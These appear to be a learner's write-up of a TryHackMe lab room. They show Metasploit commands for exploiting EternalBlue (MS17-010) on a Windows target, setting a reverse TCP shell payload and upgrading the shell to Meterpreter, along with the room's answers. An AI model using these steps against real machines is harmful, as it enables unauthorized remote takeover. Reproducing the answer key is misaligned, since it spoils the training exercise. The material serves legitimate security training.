Exploit the machine and gain a foothold.

Answer the questions below

| Question                                                    | Answer |
| ----------------------------------------------------------- | ------ |
| Start [Metasploit](https://tryhackme.com/module/metasploit) |        |

```
msfconsole
```

![[Pasted image 20240310223433.png]]


| Question                                                                                                              | Answer                                   |
| --------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........) | exploit/windows/smb/ms17_010_eternalblue |

```
search ms17-010
```

![[Pasted image 20240310223709.png]]


| Question                                                                                               | Answer |
| ------------------------------------------------------------------------------------------------------ | ------ |
| Show options and set the one required value. What is the name of this value? (All caps for submission) | RHOSTS |

![[Pasted image 20240310225613.png]]


| Question                                                                                                                                                                                                                                                                    | Answer |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------ |
| Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: `set payload windows/x64/shell/reverse_tcp` With that done, run the exploit! |        |

```
set payload windows/x64/shell/reverse_tcp
```
![[Pasted image 20240310224728.png]]

![[Pasted image 20240310225717.png]]


![[Pasted image 20240311193537.png]]

![[Pasted image 20240311194017.png]]

![[Pasted image 20240311194147.png]]

```
search shell_to_meterpreter
```
![[Pasted image 20240311194316.png]]


```
use post/multi/manage/shell_to_meterpreter
```
![[Pasted image 20240311194401.png]]


| Question                                                                                                                                                                                                                                         | Answer |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------ |
| Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. |        |
